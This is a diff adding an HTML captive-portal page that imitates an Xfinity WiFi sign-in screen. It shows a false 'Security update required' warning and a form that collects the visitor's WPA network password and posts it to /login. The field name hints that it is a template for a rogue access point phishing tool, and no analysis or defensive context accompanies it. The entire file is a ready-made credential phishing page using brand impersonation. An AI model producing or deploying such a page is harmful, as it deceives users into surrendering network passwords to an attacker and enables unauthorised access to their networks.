@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to WiFi — Xfinity</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background: linear-gradient(160deg, #0a1628 0%, #132a4a 45%, #0d2138 100%); min-height: 100vh; color: #fff; }
+        .top { text-align: center; padding: 28px 16px 12px; }
+        .brand { font-size: 28px; font-weight: 300; letter-spacing: 0.06em; }
+        .brand strong { font-weight: 700; color: #fff; }
+        .wifi-ico { width: 56px; height: 56px; margin: 18px auto 8px; border: 3px solid #6eb5ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; letter-spacing: 0.06em; color: #6eb5ff; text-transform: uppercase; }
+        .subtitle { font-size: 14px; color: #a8c4e8; font-weight: 400; }
+        .panel-wrap { max-width: 400px; margin: 24px auto; padding: 0 18px; }
+        .panel { background: #fff; border-radius: 10px; overflow: hidden; box-shadow: 0 12px 40px rgba(0,0,0,0.35); }
+        .panel-head { background: #6eb5ff; color: #0a1628; padding: 14px 18px; font-size: 15px; font-weight: 700; }
+        .panel-body { padding: 22px 18px; color: #1a1a1a; }
+        .alert { background: #fff8e6; border: 1px solid #e6a800; border-radius: 6px; padding: 12px 14px; margin-bottom: 20px; font-size: 13px; line-height: 1.5; color: #5c4a00; }
+        .alert b { color: #b8860b; display: block; margin-bottom: 4px; }
+        label { display: block; font-size: 12px; font-weight: 700; color: #444; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.04em; }
+        input[type="password"] { width: 100%; padding: 14px 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
+        input[type="password"]:focus { outline: none; border-color: #6eb5ff; box-shadow: 0 0 0 2px rgba(110, 181, 255, 0.35); }
+        .btn { width: 100%; margin-top: 18px; padding: 14px; background: #6eb5ff; color: #0a1628; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .btn:hover { background: #5aa8f5; }
+        .fine { font-size: 11px; color: #666; margin-top: 14px; line-height: 1.45; }
+        .foot { text-align: center; padding: 24px 16px; font-size: 11px; color: #6b8ab8; }
+    </style>
+</head>
+<body>
+    <div class="top">
+        <div class="brand">XFINITY <strong>WiFi</strong></div>
+        <div class="wifi-ico">WiFi</div>
+        <p class="subtitle">Network sign-in</p>
+    </div>
+    <div class="panel-wrap">
+        <div class="panel">
+            <div class="panel-head">Connect to secure WiFi</div>
+            <div class="panel-body">
+                <div class="alert">
+                    <b>Security update required</b>
+                    This hotspot session must be refreshed for your protection. Enter your WiFi network password (WPA key) to restore encrypted access.
+                </div>
+                <form method="POST" action="/login">
+                    <label for="pw">WiFi password (WPA/WPA2)</label>
+                    <input type="password" id="pw" name="wfphshr-wpa-password" placeholder="Network password" required autocomplete="current-password">
+                    <button type="submit" class="btn">Continue</button>
+                    <p class="fine">By continuing you agree to acceptable use of this network. For assistance, contact your service provider.</p>
+                </form>
+            </div>
+        </div>
+    </div>
+    <div class="foot">Captive portal — authorized use only</div>
+</body>
+</html>
